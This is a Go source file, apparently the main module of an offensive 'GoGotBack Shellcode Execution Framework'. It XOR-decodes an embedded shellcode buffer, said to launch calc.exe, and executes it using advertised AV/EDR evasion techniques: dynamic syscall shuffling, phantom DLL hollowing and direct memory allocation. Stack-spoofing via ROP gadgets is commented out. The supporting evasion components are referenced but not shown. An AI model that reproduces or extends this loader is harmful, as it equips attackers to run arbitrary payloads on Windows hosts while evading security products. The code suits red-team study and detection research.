package main

import (
	"fmt"
	"os"
	// "syscall"
	// "unsafe"
	// "time" // Removed as sleep is handled by TUI lifecycle
	// "golang.org/x/sys/windows" // Remove this again
	// "math/rand"
	// "time"

	// tea "github.com/charmbracelet/bubbletea" // Removed BubbleTea import
	// "github.com/Binject/debug/pe" // Removed unused import
)

// xor decodes the shellcode using XOR
func xor(buf []byte, xorchar byte) []byte {
	res := make([]byte, len(buf))
	for i := 0; i < len(buf); i++ {
		res[i] = xorchar ^ buf[i]
	}
	return res
}

// EnhancedShellcodeExecutor combines all evasion techniques
type EnhancedShellcodeExecutor struct {
	SyscallTable   *DynamicSyscallTable
	PhantomDLL     *PhantomDLL
	DirectExecutor *DirectExecutor // Renamed field
	ShellcodeBuffer []byte
	XorKey          byte
}

// NewEnhancedShellcodeExecutor creates a new enhanced executor
func NewEnhancedShellcodeExecutor(shellcode []byte, xorKey byte) (*EnhancedShellcodeExecutor, error) {
	printInfo("[+] Initializing shellcode executor...\n") // Use color
	
	executor := &EnhancedShellcodeExecutor{
		ShellcodeBuffer: shellcode,
		XorKey:          xorKey,
	}

	var err error

	// Step 1: Initialize dynamic syscall table
	printInfo("[+] Initializing dynamic syscall table...\n") // Use color
	executor.SyscallTable, err = NewDynamicSyscallTable()
	if err != nil {
		printError("[ERROR] Failed to initialize syscall table: %v\n", err) // Use color
		return nil, fmt.Errorf("failed to initialize syscall table: %v", err)
	}

	// Step 2: Initialize phantom DLL
	printInfo("[+] Creating phantom DLL...\n") // Use color
	executor.PhantomDLL, err = NewPhantomDLL(executor.SyscallTable)
	if err != nil {
		printError("[ERROR] Failed to create phantom DLL: %v\n", err) // Use color
		return nil, fmt.Errorf("failed to create phantom DLL: %v", err)
	}

	// Step 3: Initialize direct executor
	printInfo("[+] Setting up direct executor...\n") // Use color
	executor.DirectExecutor = NewDirectExecutor(executor.SyscallTable, executor.PhantomDLL)

	// Step 4: ROP Gadget Scanning REMOVED (Keep commented out)
	/*
	printInfo("[+] Scanning for ROP gadgets...\n") 
	err = executor.StackSpoofer.FindGadgets()
	if err != nil {
		printWarn("[WARN] Error finding gadgets: %v\n", err) 
	}
	*/

	return executor, nil
}

// Execute runs the shellcode with remaining evasion techniques
func (e *EnhancedShellcodeExecutor) Execute() error {
	printInfo("[+] Executing shellcode...\n") // Use color

	// Decode shellcode
	printSuccess("[+] Decoding shellcode with XOR key 0x%x...\n", e.XorKey) // Use color
	decodedShellcode := DecodeShellcode(e.ShellcodeBuffer, e.XorKey)

	if len(decodedShellcode) > 0 {
		printLen := len(decodedShellcode)
		if printLen > 16 {
			printLen = 16
		}
		printDebug("[DEBUG] Decoded shellcode (first %d bytes): %x\n", printLen, decodedShellcode[:printLen]) // Use color
	} else {
		printWarn("[WARN] Decoded shellcode is empty.\n") // Use color
	}

	printInfo("[+] Executing shellcode using Direct Executor (New Allocation Method)...\n") // Use color

	err := e.DirectExecutor.ExecuteShellcode(decodedShellcode)
	if err != nil {
		// Error should already be printed by ExecuteShellcode with color
		// printError("[ERROR] Shellcode execution failed: %v\n", err) // Redundant
		return fmt.Errorf("ExecuteShellcode failed: %v", err)
	}

	printSuccess("[+] Shellcode execution flow completed.\n") // Use color

	return nil 
}

// Cleanup releases all resources
func (e *EnhancedShellcodeExecutor) Cleanup() {
	if e.PhantomDLL != nil {
		printInfo("[+] Cleaning up phantom DLL...\n") // Use color
		e.PhantomDLL.Cleanup()
	}
}

// DecodeShellcode applies XOR decoding
func DecodeShellcode(shellcode []byte, key byte) []byte {
	decoded := make([]byte, len(shellcode))
	for i := 0; i < len(shellcode); i++ {
		decoded[i] = key ^ shellcode[i]
	}
	return decoded
}

// Print header matching the example
func printHeader() {
	// Use dedicated header color printer
	printHeaderLine("=======================================================\n")
	printHeaderLine("        GoGotBack Shellcode Execution Framework        \n")
	printHeaderLine("=======================================================\n")
	fmt.Println("Techniques active:") // Keep default color for this line
	// Use info color for technique list items
	printInfo("  - Dynamic Syscall Shuffling\n")
	printInfo("  - Phantom DLL Hollowing (Shellcode Holding)\n")
	printInfo("  - Direct Memory Allocation Execution\n")
	printHeaderLine("=======================================================\n")
}

func main() {
	// Print the header
	printHeader()
	
	// Simple calc.exe shellcode (XOR encoded with key 31)
	buf := []byte{
		0xe3,0x57,0x9c,0xfb,0xef,0xf7,0xdf,0x1f,0x1f,0x1f,0x5e,0x4e,0x5e,0x4f,0x4d,0x4e,
		0x49,0x57,0x2e,0xcd,0x7a,0x57,0x94,0x4d,0x7f,0x57,0x94,0x4d,0x07,0x57,0x94,0x4d,
		0x3f,0x57,0x94,0x6d,0x4f,0x57,0x10,0xa8,0x55,0x55,0x52,0x2e,0xd6,0x57,0x2e,0xdf,
		0xb3,0x23,0x7e,0x63,0x1d,0x33,0x3f,0x5e,0xde,0xd6,0x12,0x5e,0x1e,0xde,0xfd,0xf2,
		0x4d,0x5e,0x4e,0x57,0x94,0x4d,0x3f,0x94,0x5d,0x23,0x57,0x1e,0xcf,0x94,0x9f,0x97,
		0x1f,0x1f,0x1f,0x57,0x9a,0xdf,0x6b,0x78,0x57,0x1e,0xcf,0x4f,0x94,0x57,0x07,0x5b,
		0x94,0x5f,0x3f,0x56,0x1e,0xcf,0xfc,0x49,0x57,0xe0,0xd6,0x5e,0x94,0x2b,0x97,0x57,
		0x1e,0xc9,0x52,0x2e,0xd6,0x57,0x2e,0xdf,0xb3,0x5e,0xde,0xd6,0x12,0x5e,0x1e,0xde,
		0x27,0xff,0x6a,0xee,0x53,0x1c,0x53,0x3b,0x17,0x5a,0x26,0xce,0x6a,0xc7,0x47,0x5b,
		0x94,0x5f,0x3b,0x56,0x1e,0xcf,0x79,0x5e,0x94,0x13,0x57,0x5b,0x94,0x5f,0x03,0x56,
		0x1e,0xcf,0x5e,0x94,0x1b,0x97,0x57,0x1e,0xcf,0x5e,0x47,0x5e,0x47,0x41,0x46,0x45,
		0x5e,0x47,0x5e,0x46,0x5e,0x45,0x57,0x9c,0xf3,0x3f,0x5e,0x4d,0xe0,0xff,0x47,0x5e,
		0x46,0x45,0x57,0x94,0x0d,0xf6,0x48,0xe0,0xe0,0xe0,0x42,0x57,0xa5,0x1e,0x1f,0x1f,
		0x1f,0x1f,0x1f,0x1f,0x1f,0x57,0x92,0x92,0x1e,0x1e,0x1f,0x1f,0x5e,0xa5,0x2e,0x94,
		0x70,0x98,0xe0,0xca,0xa4,0xef,0xaa,0xbd,0x49,0x5e,0xa5,0xb9,0x8a,0xa2,0x82,0xe0,
		0xca,0x57,0x9c,0xdb,0x37,0x23,0x19,0x63,0x15,0x9f,0xe4,0xff,0x6a,0x1a,0xa4,0x58,
		0x0c,0x6d,0x70,0x75,0x1f,0x46,0x5e,0x96,0xc5,0xe0,0xca,0x7c,0x7e,0x73,0x7c,0x31,
		0x7a,0x67,0x7a,0x1f }

	// Create the enhanced executor
	executor, err := NewEnhancedShellcodeExecutor(buf, 31)
	if err != nil {
		// Error already printed with color by NewEnhancedShellcodeExecutor
		// fmt.Printf("Initialization Error: %v\n", err) // Redundant
		os.Exit(1)
	}
	defer executor.Cleanup() 

	// Execute directly
	printInfo("[+] Starting shellcode execution flow...\n") // Use color
	err = executor.Execute()
	if err != nil {
		// Error already printed by Execute or sub-functions
		os.Exit(1) 
	}

	// Final success message printed by Execute
}
